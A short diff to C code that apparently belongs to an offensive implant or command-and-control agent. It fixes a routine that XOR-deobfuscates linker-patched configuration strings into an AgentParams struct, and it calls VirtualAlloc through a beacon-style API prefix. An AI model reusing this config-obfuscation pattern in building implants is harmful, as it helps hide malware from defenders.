@@ -95,7 +95,7 @@ void unpack_params(char *enc_params, char *key, AgentParams *params) {
 	// Takes the packed strings patched in by the linker, deobfuscates them, and unpacks it into an AgentParams struct.
 	char *raw_params = KERNEL32$VirtualAlloc(0, PARAM_BUFFER_LEN, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 	for (int i = 0; i < PARAM_BUFFER_LEN; i++) {
-		raw_params[i] = key[i % XORKEY_LEN];
+		raw_params[i] = enc_params[i] ^ key[i % XORKEY_LEN];
 	}
 	
 	int offset = 0;
